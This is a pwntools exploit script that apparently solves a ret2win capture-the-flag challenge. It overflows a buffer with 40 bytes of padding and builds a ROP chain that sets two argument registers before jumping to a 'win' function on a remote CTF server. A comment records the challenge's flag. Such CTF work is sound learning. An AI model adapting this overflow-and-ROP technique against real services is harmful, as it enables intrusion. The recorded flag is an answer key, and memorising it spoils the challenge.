from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("ctf-chall.stembascc.com",5204)
offset = 40
win = elf.sym['win']
rop = ROP(context.binary)
rop.raw(b"A" * offset)
rop.rdi = 0xcafe
rop.rsi = 0x1337
rop.raw(win)
p.sendline(rop.chain())
write("payload",rop.chain())
p.interactive()

# Flag: STEMBACTF{S1mpl3_Ret2Win_w1th_4_4rgum3nt}